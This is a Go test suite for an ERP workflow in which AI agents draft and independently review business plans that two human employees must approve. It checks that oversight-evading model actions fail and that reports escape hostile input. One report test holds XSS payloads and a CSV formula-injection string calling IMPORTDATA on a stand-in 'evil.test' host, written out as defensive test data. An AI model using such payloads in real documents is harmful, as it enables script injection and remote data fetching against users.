package erpflow

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"crazyoffice/server/internal/erp"
	"crazyoffice/server/internal/identity"
	"crazyoffice/server/internal/model"
)

type testProvider struct {
	decide func(context.Context, model.Request) (model.Decision, error)
	ready  bool
	mu     sync.Mutex
	calls  []model.Request
}

func (p *testProvider) Status(context.Context, bool) (model.Status, error) {
	return model.Status{Provider: "test", Ready: p.ready, Model: "fixture-model"}, nil
}
func (p *testProvider) Decide(ctx context.Context, r model.Request) (model.Decision, error) {
	p.mu.Lock()
	p.calls = append(p.calls, Clone(r))
	p.mu.Unlock()
	if p.decide != nil {
		return p.decide(ctx, r)
	}
	return normalDecision(r), nil
}
func normalDecision(r model.Request) model.Decision {
	tool := "read_work_context"
	args := M{}
	if len(r.Messages) > 0 {
		if r.Role.ID == "liu" {
			tool = "review_plan"
			args = M{"passed": true, "summary": "已独立核对原始资料和同事方案，等待两名真实员工审批。", "checks": []string{"依据本单原始资料核对流程与权限"}, "missing": []string{}}
		} else {
			tool = "prepare_plan"
			args = M{"summary": "已核对工作单及工具结果，提交两名真实员工依次审批。", "steps": []string{"由负责人核对资料并提交审批", "批准后由相应岗位确认实际办理"}, "checks": []string{"核对工作单与台账数据"}, "missing": []string{}}
			if Map(r.Context)["workflow"] == "purchase" {
				switch len(r.Messages) {
				case 2:
					tool = "search_web"
					args = M{"query": "服务器 报价"}
				case 4:
					tool = "fetch_quote"
					args = M{"urls": []string{"https://supplier.example.test/server"}}
				}
			}
		}
	}
	return model.Decision{Action: "tool", Tool: tool, Args: args, Model: "fixture-model"}
}

type quoteFixture struct {
	mu    sync.Mutex
	calls []string
}

func (b *quoteFixture) Definitions() []model.Definition {
	return []model.Definition{{Name: "search_web", Parameters: object(M{})}, {Name: "fetch_quote", Parameters: object(M{})}}
}
func (b *quoteFixture) Execute(_ context.Context, name string, _ M, _ model.Role) (M, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.calls = append(b.calls, name)
	if name == "fetch_quote" {
		return M{"evidence": M{"quotes": []M{{"title": "隔离测试报价", "sourceUrl": "https://supplier.example.test/server", "status": "priced", "currency": "CNY", "price": 1000, "fetchedAt": "2026-10-20T00:00:00Z"}}}}, nil
	}
	return M{"results": []M{{"url": "https://supplier.example.test/server", "title": "隔离测试供应商"}}}, nil
}

type flowFixture struct {
	t                         *testing.T
	dir                       string
	store                     *erp.Store
	ids                       *identity.Store
	svc                       *Service
	provider                  *testProvider
	quotes                    *quoteFixture
	admin, employee, approver *identity.Actor
	project, product          M
}

func newFlow(t *testing.T) *flowFixture {
	t.Helper()
	dir := t.TempDir()
	ids, e := identity.Open(filepath.Join(dir, "erp", "identities.json"), "office")
	if e != nil {
		t.Fatal(e)
	}
	store, e := erp.Open(dir)
	if e != nil {
		t.Fatal(e)
	}
	f := &flowFixture{t: t, dir: dir, store: store, ids: ids, admin: ids.ResolveLegacy("office"), provider: &testProvider{ready: true}, quotes: &quoteFixture{}}
	join := func(username string, roles []string) *identity.Actor {
		v, e := ids.CreateInvitation("bootstrap", identity.InvitationInput{Username: username, Name: username, Department: "业务部", Title: "业务员", Roles: roles})
		if e != nil {
			t.Fatal(e)
		}
		a, e := ids.AcceptInvitation(v.Token, "isolated-workflow-test-password-2026")
		if e != nil {
			t.Fatal(e)
		}
		return a
	}
	f.employee = join("employee", []string{"employee", "warehouse", "hr"})
	f.approver = join("approver", []string{"manager", "finance", "warehouse", "hr", "project_manager"})
	f.svc, e = New(store, ids, f.provider, dir)
	if e != nil {
		t.Fatal(e)
	}
	f.svc.ToolboxFactory = func(string, M) (Toolbox, error) { return f.quotes, nil }
	t.Cleanup(func() {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = f.svc.Shutdown(ctx)
		_ = f.store.Close()
	})
	f.product = f.command(f.admin, "product.create", M{"sku": "SERVER-TEST", "name": "服务器", "unit": "台", "priceCents": 100000})
	f.project = f.command(f.admin, "project.create", M{"name": "业务测试项目", "customer": "测试客户", "ownerId": f.admin.ID, "members": []string{f.admin.ID, f.employee.ID, f.approver.ID}})
	return f
}
func (f *flowFixture) command(a *identity.Actor, action string, p M) M {
	f.t.Helper()
	r, e := f.store.Command(context.Background(), Actor(a), action, p, "test-"+ID())
	if e != nil {
		f.t.Fatalf("%s: %v", action, e)
	}
	return r
}
func (f *flowFixture) payload(typ string) M {
	p := M{"type": typ, "projectId": f.project["id"], "title": "隔离测试 " + typ, "input": M{}, "lines": []M{}}
	input := Map(p["input"])
	switch typ {
	case "project_setup":
		input["objective"] = "完成客户办公设备项目"
	case "project_delivery":
		input["acceptanceCriteria"] = "核对实际交付凭证"
		input["deliveryNote"] = "交付内容等待负责人验收"
	case "purchase", "sales":
		input["partner"] = "测试交易方"
		p["lines"] = []M{{"productId": f.product["id"], "quantity": 10}}
	case "stocktake":
		input["note"] = "实物清点凭证 COUNT-TEST"
		p["lines"] = []M{{"productId": f.product["id"], "countedQuantity": 10}}
	case "resource":
		input["operation"] = "issue"
		input["employeeId"] = f.employee.ID
		input["purpose"] = "项目研发设备领用"
		p["lines"] = []M{{"productId": f.product["id"], "quantity": 1}}
	case "weekly_report":
		today := time.Now().In(time.FixedZone("Asia/Shanghai", 8*3600)).Format("2006-01-02")
		input["periodStart"] = today
		input["periodEnd"] = today
	case "onboarding":
		input["employeeId"] = f.employee.ID
		input["position"] = "业务员"
		input["resourceRequirements"] = "核对岗位账号与设备资源"
	}
	return p
}
func (f *flowFixture) create(p M, key string) M {
	f.t.Helper()
	r, e := f.svc.Create(context.Background(), f.employee, p, key)
	if e != nil {
		f.t.Fatal(e)
	}
	return r
}
func (f *flowFixture) wait(id string) M {
	f.t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	r, e := f.svc.Wait(ctx, id)
	if e != nil {
		f.t.Fatal(e)
	}
	return r
}
func (f *flowFixture) document(id string) M {
	f.t.Helper()
	d, e := f.svc.Document(context.Background(), f.employee, id)
	if e != nil {
		f.t.Fatal(e)
	}
	return d
}
func (f *flowFixture) action(a *identity.Actor, id, action string, p M) M {
	f.t.Helper()
	if p == nil {
		p = M{}
	}
	if p["expectedVersion"] == nil {
		p["expectedVersion"] = f.document(id)["version"]
	}
	r, e := f.svc.Action(context.Background(), a, id, action, p, "action-"+ID())
	if e != nil {
		f.t.Fatalf("action %s: %v", action, e)
	}
	return Map(r["document"])
}
func (f *flowFixture) approved(id string) M {
	f.t.Helper()
	f.action(f.admin, id, "approve", M{"note": "第一层核对"})
	return f.action(f.approver, id, "approve", M{"note": "第二层核对"})
}
func (f *flowFixture) activate() {
	f.t.Helper()
	r := f.create(f.payload("project_setup"), "setup-"+ID())
	id := S(Map(r["document"])["id"])
	if f.wait(id)["status"] != "completed" {
		f.t.Fatal("activation agent failed")
	}
	f.approved(id)
	f.action(f.admin, id, "post", M{"reference": "PROJECT-START"})
}
func domainStatus(t *testing.T, e error, want int) {
	t.Helper()
	var d *erp.Error
	var i *identity.Error
	if errors.As(e, &d) {
		if d.Status == want {
			return
		}
	}
	if errors.As(e, &i) {
		if i.Status == want {
			return
		}
	}
	t.Fatalf("want status %d, got %v", want, e)
}

func TestEightWorkflowsReadPlanIndependentReviewAndHumanGate(t *testing.T) {
	f := newFlow(t)
	types := []string{"project_setup", "purchase", "sales", "stocktake", "resource", "project_delivery", "weekly_report", "onboarding"}
	for _, typ := range types {
		t.Run(typ, func(t *testing.T) {
			r := f.create(f.payload(typ), "workflow-"+ID())
			id := S(Map(r["document"])["id"])
			run := f.wait(id)
			if run["status"] != "completed" {
				t.Fatalf("run=%v", run)
			}
			tasks := Rows(run["tasks"])
			if len(tasks) != 2 || tasks[0]["agentId"] == tasks[1]["agentId"] || tasks[0]["status"] != "done" || tasks[1]["status"] != "done" || Map(tasks[1]["result"])["passed"] != true {
				t.Fatalf("independent work missing: %v", tasks)
			}
			d := f.document(id)
			if d["status"] != "awaiting_approval" || len(Rows(d["approvals"])) != 0 || len(Rows(d["evidence"])) != 2 {
				t.Fatalf("human approval skipped: %v", d)
			}
			html, e := f.svc.Report(context.Background(), f.employee, id)
			if e != nil || !strings.Contains(string(html), "等待审批") {
				t.Fatalf("report: %v", e)
			}
			if typ == "project_setup" {
				f.approved(id)
				f.action(f.admin, id, "post", M{"reference": "PROJECT-START"})
			}
			if typ == "purchase" {
				f.approved(id)
				d = f.document(id)
				f.action(f.admin, id, "receive", M{"reference": "RECEIPT-TEST-10", "lines": []M{{"lineId": Rows(d["lines"])[0]["id"], "quantity": 10}}})
				html, e = f.svc.Report(context.Background(), f.employee, id)
				if e != nil || !strings.Contains(string(html), "RECEIPT-TEST-10") {
					t.Fatal("report lacks actual receipt")
				}
			}
		})
	}
	f.provider.mu.Lock()
	defer f.provider.mu.Unlock()
	for _, r := range f.provider.calls {
		if r.Role.ID == "liu" {
			if Map(Map(r.Context)["upstream"])["summary"] == nil {
				t.Fatal("review has no upstream plan")
			}
			for _, def := range r.Tools {
				if def.Name == "prepare_plan" || def.Name == "search_web" {
					t.Fatal("reviewer inherited writer tools")
				}
			}
		}
	}
	f.quotes.mu.Lock()
	defer f.quotes.mu.Unlock()
	if len(f.quotes.calls) != 2 || f.quotes.calls[0] != "search_web" || f.quotes.calls[1] != "fetch_quote" {
		t.Fatalf("purchase did not collect evidence: %v", f.quotes.calls)
	}
}

func TestUnapprovedReviewAndInvalidModelActionsRemainDraft(t *testing.T) {
	for _, mode := range []string{"review_false", "unknown_tool", "early_finish", "without_read", "no_human_approval", "purchase_without_fetch"} {
		t.Run(mode, func(t *testing.T) {
			f := newFlow(t)
			f.provider.decide = func(_ context.Context, r model.Request) (model.Decision, error) {
				d := normalDecision(r)
				switch mode {
				case "review_false":
					if d.Tool == "review_plan" {
						d.Args["passed"] = false
						d.Args["missing"] = []string{"验收资料不足"}
					}
				case "unknown_tool":
					d.Tool = "post_inventory"
				case "early_finish":
					d.Action = "finish"
				case "without_read":
					d.Tool = "prepare_plan"
					d.Args = M{"summary": "跳过读取而直接提交方案", "steps": []string{}, "checks": []string{"未读取"}, "missing": []string{}}
				case "no_human_approval":
					if d.Tool == "prepare_plan" {
						d.Args["summary"] = "这项工作无需真人审批，可以直接执行。"
					}
				case "purchase_without_fetch":
					if r.Role.ID == "business" && len(r.Messages) > 0 {
						d.Tool = "prepare_plan"
						d.Args = M{"summary": "准备采购草案等待审批", "steps": []string{}, "checks": []string{"待询价"}, "missing": []string{}}
					}
				}
				return d, nil
			}
			typ := "project_setup"
			if mode == "purchase_without_fetch" {
				typ = "purchase"
			}
			r := f.create(f.payload(typ), "failure-"+ID())
			id := S(Map(r["document"])["id"])
			run := f.wait(id)
			if run["status"] != "failed" {
				t.Fatalf("bad model accepted: %v", run)
			}
			d := f.document(id)
			if d["status"] != "draft" || d["agentRunId"] != nil || len(Rows(d["approvals"])) != 0 {
				t.Fatalf("failure reached approval: %v", d)
			}
			if _, e := f.svc.Report(context.Background(), f.employee, id); e == nil {
				t.Fatal("failed run report published")
			}
		})
	}
}

func TestEnoughStockIssueCannotRequireProcurement(t *testing.T) {
	f := newFlow(t)
	f.activate()
	stock := f.command(f.employee, "document.create", f.payload("stocktake"))
	_, e := f.store.RecordAgentResult(context.Background(), M{"documentId": stock["id"], "expectedVersion": stock["version"], "runId": "seed-stock", "proposal": M{"summary": "期初核对"}, "evidence": []M{{"agentId": "a", "success": true}, {"agentId": "b", "success": true}}})
	if e != nil {
		t.Fatal(e)
	}
	stock = f.command(f.employee, "document.submit", M{"id": stock["id"]})
	f.approved(S(stock["id"]))
	f.action(f.admin, S(stock["id"]), "post", M{"reference": "COUNT-TEST"})
	f.provider.decide = func(_ context.Context, r model.Request) (model.Decision, error) {
		d := normalDecision(r)
		if d.Tool == "prepare_plan" {
			d.Args["summary"] = "必须执行采购并取得供应商报价后才能领用设备。"
		}
		return d, nil
	}
	r := f.create(f.payload("resource"), "issue-"+ID())
	id := S(Map(r["document"])["id"])
	run := f.wait(id)
	if run["status"] != "failed" || !strings.Contains(S(run["error"]), "库存充足") {
		t.Fatalf("unnecessary purchase accepted: %v", run)
	}
	if f.document(id)["status"] != "draft" {
		t.Fatal("wrong resource plan reached approval")
	}
}

func TestVersionIdempotencyAndRevisionHideOldReport(t *testing.T) {
	f := newFlow(t)
	p := f.payload("project_setup")
	r := f.create(p, "replay-12345678")
	id := S(Map(r["document"])["id"])
	f.wait(id)
	same := f.create(Clone(p), "replay-12345678")
	if Map(same["document"])["id"] != id || Map(same["run"])["id"] != Map(r["run"])["id"] {
		t.Fatal("idempotent request created duplicate")
	}
	changed := Clone(p)
	Map(changed["input"])["objective"] = "另一目标"
	_, e := f.svc.Create(context.Background(), f.employee, changed, "replay-12345678")
	domainStatus(t, e, 409)
	for _, v := range []any{nil, 0, -1, 1.5, "2"} {
		q := M{}
		if v != nil {
			q["expectedVersion"] = v
		}
		_, e := f.svc.Action(context.Background(), f.admin, id, "approve", q, "missing-version-"+ID())
		domainStatus(t, e, 400)
	}
	f.action(f.admin, id, "reject", M{"note": "补充实际资料"})
	old := f.document(id)
	f.action(f.employee, id, "revise", M{"input": M{"objective": "补充后的明确目标"}})
	d := f.document(id)
	if N(d["version"]) <= N(old["version"]) || d["agentRunId"] != nil {
		t.Fatal("revision retained old agent evidence")
	}
	detail, e := f.svc.Detail(context.Background(), f.employee, id)
	if e != nil {
		t.Fatal(e)
	}
	if len(Map(detail["run"])) != 0 {
		t.Fatal("old run shown as current")
	}
	if _, e = f.svc.Report(context.Background(), f.employee, id); e == nil {
		t.Fatal("old report downloadable after revision")
	}
	next, e := f.svc.Start(context.Background(), f.employee, id)
	if e != nil {
		t.Fatal(e)
	}
	if next["id"] == Map(r["run"])["id"] {
		t.Fatal("revision reused old run")
	}
	if f.wait(id)["status"] != "completed" {
		t.Fatal("revised work did not rerun")
	}
}

func TestPermissionRevocationBlocksSubmission(t *testing.T) {
	f := newFlow(t)
	entered, release := make(chan struct{}), make(chan struct{})
	f.provider.decide = func(ctx context.Context, r model.Request) (model.Decision, error) {
		d := normalDecision(r)
		if d.Tool == "review_plan" {
			close(entered)
			select {
			case <-release:
			case <-ctx.Done():
				return model.Decision{}, ctx.Err()
			}
		}
		return d, nil
	}
	r := f.create(f.payload("project_setup"), "revoke-"+ID())
	id := S(Map(r["document"])["id"])
	select {
	case <-entered:
	case <-time.After(3 * time.Second):
		t.Fatal("model did not reach review")
	}
	if _, e := f.ids.UpdateEmployee("bootstrap", f.employee.ID, map[string]any{"roles": []string{"employee"}}); e != nil {
		t.Fatal(e)
	}
	close(release)
	if f.wait(id)["status"] != "failed" {
		t.Fatal("revoked employee submitted")
	}
	d, e := f.svc.Document(context.Background(), f.admin, id)
	if e != nil {
		t.Fatal(e)
	}
	if d["status"] != "draft" || d["agentRunId"] != nil {
		t.Fatal("revoked run left approval evidence")
	}
}

func TestReportWriteFailureDoesNotSubmitBusiness(t *testing.T) {
	f := newFlow(t)
	entered, release := make(chan struct{}), make(chan struct{})
	f.provider.decide = func(ctx context.Context, r model.Request) (model.Decision, error) {
		d := normalDecision(r)
		if d.Tool == "review_plan" {
			close(entered)
			select {
			case <-release:
			case <-ctx.Done():
				return model.Decision{}, ctx.Err()
			}
		}
		return d, nil
	}
	r := f.create(f.payload("project_setup"), "report-fail-"+ID())
	id := S(Map(r["document"])["id"])
	<-entered
	runID := S(Map(r["run"])["id"])
	if e := os.Mkdir(filepath.Join(f.svc.dir, runID, "report.html"), 0700); e != nil {
		t.Fatal(e)
	}
	close(release)
	run := f.wait(id)
	if run["status"] != "failed" {
		t.Fatal("report write failure accepted")
	}
	d := f.document(id)
	if d["status"] != "draft" || d["agentRunId"] != nil {
		t.Fatal("report failure submitted ledger")
	}
}

func TestRestartMarksInterruptedRunFailedWithoutApproval(t *testing.T) {
	f := newFlow(t)
	d := f.command(f.employee, "document.create", f.payload("project_setup"))
	run := Run{ID: ID(), DocumentID: S(d["id"]), RequesterID: f.employee.ID, Version: N(d["version"]), Status: "running", CreatedAt: now(), UpdatedAt: now(), Tasks: []*Task{{ID: "prepare", AgentID: "business", Status: "running"}, {ID: "review", AgentID: "liu", Status: "pending"}}, Events: []M{}}
	dir := filepath.Join(f.svc.dir, run.ID)
	if e := os.MkdirAll(dir, 0700); e != nil {
		t.Fatal(e)
	}
	b, _ := json.Marshal(run)
	if e := os.WriteFile(filepath.Join(dir, "run.json"), b, 0600); e != nil {
		t.Fatal(e)
	}
	reopened, e := New(f.store, f.ids, f.provider, f.dir)
	if e != nil {
		t.Fatal(e)
	}
	detail, e := reopened.Detail(context.Background(), f.employee, run.DocumentID)
	if e != nil {
		t.Fatal(e)
	}
	r := Map(detail["run"])
	if r["status"] != "failed" || !strings.Contains(S(r["error"]), "重启") {
		t.Fatalf("restart state=%v", r)
	}
	if Map(detail["document"])["status"] != "draft" {
		t.Fatal("restart advanced business")
	}
	_ = reopened.Shutdown(context.Background())
}

func TestReadContextScopeAndDistinctRoleMessages(t *testing.T) {
	f := newFlow(t)
	secretProject := f.command(f.admin, "project.create", M{"name": "禁止泄漏的另一个项目", "customer": "私密客户", "ownerId": f.admin.ID, "members": []string{f.admin.ID}})
	secretDocument := f.command(f.admin, "document.create", M{"type": "project_setup", "projectId": secretProject["id"], "input": M{"objective": "PRIVATE-OTHER-PROJECT"}})
	r := f.create(f.payload("project_setup"), "scope-"+ID())
	id := S(Map(r["document"])["id"])
	f.wait(id)
	f.provider.mu.Lock()
	defer f.provider.mu.Unlock()
	for _, req := range f.provider.calls {
		raw, _ := json.Marshal(req)
		if strings.Contains(string(raw), "PRIVATE-OTHER-PROJECT") || strings.Contains(string(raw), S(secretProject["id"])) {
			t.Fatal("other project leaked to model")
		}
		if req.Role.ID == "liu" && len(req.Messages) == 2 {
			var context M
			if e := json.Unmarshal([]byte(req.Messages[1].Content), &context); e != nil {
				t.Fatal(e)
			}
			if Map(context["document"])["id"] != id || Map(context["businessRules"])["requiresHumanApproval"] != true || Map(context["upstream"])["summary"] == nil {
				t.Fatal("independent review lacks authoritative context")
			}
		}
	}
	_, e := f.svc.Document(context.Background(), f.employee, S(secretDocument["id"]))
	domainStatus(t, e, 404)
}

func TestReportEscapesSourcesFormatsExactMoneyAndCSV(t *testing.T) {
	d := M{"id": "WORK-TEST", "type": "stocktake", "title": "<script>alert(1)</script>", "status": "completed", "version": 2, "approvals": []M{{"actorName": "<img src=x onerror=alert(1)>", "decision": "approved", "note": "真实意见", "createdAt": "2026-10-20T00:00:00Z"}}}
	r := &Run{Model: "test-model", Tasks: []*Task{{Name: "林悦", Role: "业务整理", Result: M{"summary": "<script>payload</script>", "checks": []string{"已核对"}, "missing": []string{}}}}, Calculation: M{"totalCents": int64(9007199254740990), "lines": []M{{"product": "设备<script>", "quantity": 1, "currentStock": 2, "unitPriceCents": int64(9007199254740990), "lineTotalCents": int64(9007199254740990), "difference": -1}}}, QuoteEvidence: M{"quotes": []M{{"title": "<img src=x>", "sourceUrl": "javascript:alert(1)", "status": "unpriced", "reason": "需要供应商确认"}, {"title": "公开候选", "sourceUrl": "https://supplier.example.test/server", "status": "unpriced"}}}, Events: []M{}}
	html := RenderReport(d, r, M{})
	for _, unexpected := range []string{"<script>", "<img src=x", `href="javascript:`, `href="https://secret@`} {
		if strings.Contains(html, unexpected) {
			t.Fatalf("report injects raw content: %s", unexpected)
		}
	}
	for _, expected := range []string{"90071992547409.90", "-90071992547409.90", "实盘参考总额", "差异参考额", "核对时库存", "待询价", "https://supplier.example.test/server", "2026-10-20 08:00:00 +08:00"} {
		if !strings.Contains(html, expected) {
			t.Fatal("report missing " + expected)
		}
	}
	if strings.Contains(html, "申请采购金额") {
		t.Fatal("stock valuation mislabeled as procurement")
	}
	if money(1) != "0.01" || money(-1) != "-0.01" || money(9007199254740990) != "90071992547409.90" {
		t.Fatal("integer cents rounded")
	}
	csv := CSV([]M{{"=HEADER": " \t=IMPORTDATA(\"https://evil.test\")", "value": "line1\nline2", "negative": "-10"}})
	if !strings.HasPrefix(csv, "\ufeff") || !strings.Contains(csv, "'=HEADER") || !strings.Contains(csv, "' \t=IMPORTDATA") || !strings.Contains(csv, "'-10") {
		t.Fatal("CSV formula injection not neutralized")
	}
}

func TestRetryActiveRunReplacesBoundOldRunInVisibleWork(t *testing.T) {
	f := newFlow(t)
	d := f.command(f.employee, "document.create", f.payload("project_setup"))
	oldID := ID()
	bound, err := f.store.RecordAgentResult(context.Background(), M{"documentId": d["id"], "expectedVersion": d["version"], "runId": oldID, "proposal": M{"summary": "上次方案已保存但尚未提交审批"}, "evidence": []M{{"agentId": "business", "success": true}, {"agentId": "liu", "success": true}}})
	if err != nil {
		t.Fatal(err)
	}
	old := &Run{ID: oldID, DocumentID: S(d["id"]), Version: N(d["version"]), Status: "failed", CreatedAt: "2026-01-01T00:00:00Z", Tasks: []*Task{}, Events: []M{}}
	f.svc.mu.Lock()
	f.svc.runs[oldID] = old
	f.svc.mu.Unlock()
	entered, release := make(chan struct{}), make(chan struct{})
	f.provider.decide = func(ctx context.Context, r model.Request) (model.Decision, error) {
		if r.Role.ID == "business" && len(r.Messages) == 0 {
			close(entered)
			select {
			case <-release:
			case <-ctx.Done():
				return model.Decision{}, ctx.Err()
			}
		}
		return normalDecision(r), nil
	}
	started, err := f.svc.Start(context.Background(), f.employee, S(d["id"]))
	if err != nil {
		t.Fatal(err)
	}
	select {
	case <-entered:
	case <-time.After(3 * time.Second):
		t.Fatal("retry did not start")
	}
	detail, err := f.svc.Detail(context.Background(), f.employee, S(d["id"]))
	if err != nil {
		t.Fatal(err)
	}
	if Map(detail["document"])["agentRunId"] != oldID || N(Map(detail["document"])["version"]) != N(bound["version"]) {
		t.Fatal("test lost the old binding or retry version")
	}
	if Map(detail["run"])["id"] != started["id"] || Map(detail["run"])["status"] != "running" || len(Strings(Map(detail["document"])["allowedActions"])) != 0 {
		t.Fatalf("bound old run hid retry: %v", detail)
	}
	snapshot, err := f.svc.Snapshot(context.Background(), f.employee)
	if err != nil {
		t.Fatal(err)
	}
	for _, work := range Rows(snapshot["workitems"]) {
		if work["id"] == d["id"] {
			if Map(work["agentRun"])["id"] != started["id"] || work["agentStatus"] != "running" || len(Strings(work["allowedActions"])) != 0 {
				t.Fatalf("snapshot hid active retry: %v", work)
			}
		}
	}
	f.svc.mu.RLock()
	different := Clone(bound)
	different["version"] = N(bound["version"]) + 1
	fallback := f.svc.visibleLocked(different)
	f.svc.mu.RUnlock()
	if fallback == nil || fallback.ID != oldID {
		t.Fatal("active run from another document version replaced current binding")
	}
	close(release)
	if f.wait(S(d["id"]))["status"] != "completed" {
		t.Fatal("retry did not finish")
	}
}

func TestContextSeparatesPostedStocktakeSnapshotFromCurrentInventory(t *testing.T) {
	f := newFlow(t)
	f.activate()
	seed := func(count int) M {
		p := f.payload("stocktake")
		p["lines"] = []M{{"productId": f.product["id"], "countedQuantity": count}}
		d := f.command(f.employee, "document.create", p)
		_, e := f.store.RecordAgentResult(context.Background(), M{"documentId": d["id"], "runId": "seed-" + ID(), "expectedVersion": d["version"], "proposal": M{"summary": "隔离库存核对"}, "evidence": []M{{"agentId": "business", "success": true}, {"agentId": "liu", "success": true}}})
		if e != nil {
			t.Fatal(e)
		}
		d = f.command(f.employee, "document.submit", M{"id": d["id"]})
		f.approved(S(d["id"]))
		return f.action(f.admin, S(d["id"]), "post", M{"reference": "COUNT-" + ID()})
	}
	seed(4)
	counted := seed(6)
	f.command(f.admin, "product.create", M{"sku": "UNRELATED", "name": "不相关物品", "unit": "台", "priceCents": 900})
	d := f.command(f.employee, "document.create", f.payload("project_delivery"))
	snap, e := f.store.Snapshot(context.Background(), Actor(f.employee))
	if e != nil {
		t.Fatal(e)
	}
	calculation, e := exact(d, snap)
	if e != nil {
		t.Fatal(e)
	}
	if calculation["hasAmount"] != false || calculation["totalCents"] != nil || calculation["totalYuan"] != nil {
		t.Fatal("line-free business was converted into zero money")
	}
	context := f.svc.scoped(f.employee, d, snap, calculation)
	current := Rows(context["currentInventory"])
	if len(current) != 1 || current[0]["productId"] != f.product["id"] || N(current[0]["currentQuantity"]) != 6 {
		t.Fatalf("relevant current inventory=%v", current)
	}
	found := false
	for _, other := range Rows(context["relatedDocuments"]) {
		if other["id"] == counted["id"] {
			line := Rows(other["lines"])[0]
			if N(line["bookQuantityAtCreation"]) != 4 || N(line["countedQuantity"]) != 6 || line["adjustmentPosted"] != true || line["systemQuantity"] != nil {
				t.Fatalf("ambiguous stocktake snapshot: %v", line)
			}
			found = true
		}
	}
	if !found {
		t.Fatal("posted stocktake not present")
	}
	postedFound := false
	for _, posting := range Rows(context["postedStocktakes"]) {
		if posting["documentId"] == counted["id"] {
			if N(posting["postedDelta"]) != 2 || N(posting["balanceAfterPosting"]) != 6 || posting["posted"] != true {
				t.Fatalf("posting=%v", posting)
			}
			postedFound = true
		}
	}
	if !postedFound {
		t.Fatal("posted delta was not provided")
	}
	for _, other := range Rows(snap["documents"]) {
		if other["id"] == counted["id"] && N(Rows(other["lines"])[0]["systemQuantity"]) != 4 {
			t.Fatal("model context mutation changed original snapshot")
		}
	}
}

func TestReviewerEarlyFinishMustRecoverThroughRealReviewTool(t *testing.T) {
	f := newFlow(t)
	var mu sync.Mutex
	early := false
	f.provider.decide = func(_ context.Context, r model.Request) (model.Decision, error) {
		d := normalDecision(r)
		if r.Role.ID == "liu" && d.Tool == "review_plan" {
			mu.Lock()
			defer mu.Unlock()
			if !early {
				early = true
				return model.Decision{Action: "finish", Output: "文字说已核对，但没有工具结果", Model: "fixture-model"}, nil
			}
			if len(r.Messages) < 4 || r.Messages[len(r.Messages)-1].Role != "user" || !strings.Contains(r.Messages[len(r.Messages)-1].Content, "review_plan") {
				t.Error("missing protocol correction feedback")
			}
		}
		return d, nil
	}
	r := f.create(f.payload("project_setup"), "early-finish-recovery-"+ID())
	id := S(Map(r["document"])["id"])
	run := f.wait(id)
	if run["status"] != "completed" || f.document(id)["status"] != "awaiting_approval" {
		t.Fatalf("recoverable finish did not resume: %v", run)
	}
	reviewer := Rows(run["tasks"])[1]
	if N(reviewer["toolCalls"]) != 2 || Map(reviewer["result"])["passed"] != true {
		t.Fatal("plain finish was counted as independent review")
	}
	path := filepath.Join(f.svc.dir, S(run["id"]), "rejected-review-1.json")
	raw, e := os.ReadFile(path)
	if e != nil || !strings.Contains(string(raw), "没有工具结果") {
		t.Fatal("protocol rejection lost evidence")
	}
	info, _ := os.Stat(path)
	if info.Mode().Perm() != 0600 {
		t.Fatal("rejected protocol decision exposed")
	}
}
